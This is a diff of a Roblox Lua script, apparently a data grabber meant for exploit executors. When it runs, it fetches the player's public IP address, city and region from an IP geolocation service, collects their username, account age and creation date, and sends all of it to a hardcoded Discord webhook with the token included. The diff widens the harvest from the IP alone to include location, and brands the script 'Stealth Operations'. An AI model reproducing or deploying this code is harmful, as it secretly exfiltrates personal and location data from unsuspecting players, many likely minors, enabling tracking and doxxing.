@@ -1,17 +1,16 @@
--- [ SISTEMA DE LOGS ATUALIZADO - PAINEL KOVARIK ]
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 
--- Configure sua Webhook abaixo
+
 local Webhook_URL = "https://discord.com/api/webhooks/1492078460548415508/0DTMWHe9C_Sa4TPWWzGirUVetHdZLsys6riUbvIp6b14gXJSZi3RMK1jJzaewG81L8vp"
 
--- Função universal de requisição (Detecta Executor ou Studio)
+
 local function HttpRequest(url, method, body)
     local requestFunc = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
     
     if requestFunc then
-        -- Se estiver usando um Executor (Synapse, Fluxus, etc)
         return requestFunc({
             Url = url,
             Method = method or "GET",
@@ -19,7 +18,6 @@ local function HttpRequest(url, method, body)
             Body = body
         })
     else
-        -- Se estiver no Roblox Studio/Game oficial (Requer Allow HTTP Requests)
         if method == "POST" then
             return HttpService:PostAsync(url, body)
         else
@@ -29,57 +27,69 @@ local function HttpRequest(url, method, body)
 end
 
 local function GetUserData()
+    -- Dados Básicos
     local user_id = lp.UserId
     local username = lp.Name
     local display_name = lp.DisplayName
     
+    
     local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId="..user_id.."&width=420&height=420&format=png"
-    local public_ip = "N/A (Block)"
-
-    -- 1. PEGAR O IP REAL (Usando Proxy para evitar bloqueio)
+    
+    
+    local public_ip = "N/A"
+    local localidade = "Desconhecida"
+    local estado = "N/A"
+    
+    
     pcall(function()
-        -- Usamos um endpoint que retorna apenas texto para facilitar
-        local response = HttpRequest("https://api.ipify.org")
-        if type(response) == "table" then
-            public_ip = response.Body
-        else
-            public_ip = response
+        local response = HttpRequest("http://ip-api.com/json/")
+        local data = HttpService:JSONDecode(type(response) == "table" and response.Body or response)
+        
+        if data and data.status == "success" then
+            public_ip = data.query
+            localidade = data.city
+            estado = data.regionName
         end
     end)
 
-    -- 2. DADOS ADICIONAIS (Usando Roproxy para não tomar block do Roblox)
-    local creation_date = "Privado"
+    
+    local creation_date = "N/A"
     pcall(function()
-        local url = "https://users.roproxy.com/v1/users/"..user_id
-        local res = HttpRequest(url)
+        local res = HttpRequest("https://users.roproxy.com/v1/users/"..user_id)
         local data = HttpService:JSONDecode(type(res) == "table" and res.Body or res)
         if data and data.created then
-            creation_date = data.created:sub(1, 10)
+            local date = data.created:sub(1, 10)
+            local y, m, d = date:match("(%d+)-(%d+)-(%d+)")
+            creation_date = d.."/"..m.."/"..y
         end
     end)
 
+    
     local data = {
         ["content"] = "||@everyone @here||",
-        ["username"] = "Kovarik",
+        ["username"] = "Morningstars",
         ["embeds"] = {{
-            ["title"] = "+1 Result Account 🔥",
-            ["description"] = "[Rolimons](https://www.rolimons.com/player/"..user_id..") | [Roblox Profile](https://www.roblox.com/users/"..user_id.."/profile)",
-            ["color"] = 11097043,
+            ["title"] = "Nova Conta",
+            ["description"] = "Acesso detectado.",
+            ["color"] = 0, -- Cor Preta (Minimalista)
             ["thumbnail"] = {["url"] = thumb},
-            ["footer"] = {["text"] = "Painel Kovarik Security | Stealth Ops"},
+            ["footer"] = {["text"] = "© 2026 Morningstars Legacy • Stealth Operations"},
             ["fields"] = {
-                {["name"] = "Username", ["value"] = username .. " ("..display_name..")", ["inline"] = true},
-                {["name"] = "Creation Date", ["value"] = creation_date, ["inline"] = true},
-                {["name"] = "Account Age", ["value"] = lp.AccountAge .. " dias", ["inline"] = true},
-                {["name"] = "IP Address", ["value"] = "||" .. public_ip .. "||", ["inline"] = false},
+                {["name"] = "Usuário", ["value"] = "**" .. username .. "** ("..display_name..")", ["inline"] = true},
+                {["name"] = "Criação", ["value"] = creation_date, ["inline"] = true},
+                {["name"] = "Idade da Conta", ["value"] = lp.AccountAge .. " dias", ["inline"] = true},
+                {["name"] = "Localização", ["value"] = localidade .. ", " .. estado, ["inline"] = true},
+                {["name"] = "Endereço IP", ["value"] = "||" .. public_ip .. "||", ["inline"] = true},
+                {["name"] = "Links", ["value"] = "[Perfil](https://www.roblox.com/users/"..user_id.."/profile) | [Rolimons](https://www.rolimons.com/player/"..user_id..")", ["inline"] = false},
             }
         }}
     }
 
-    -- 3. ENVIO FINAL
+    
     pcall(function()
         HttpRequest(Webhook_URL, "POST", HttpService:JSONEncode(data))
     end)
 end
+
 
 GetUserData()
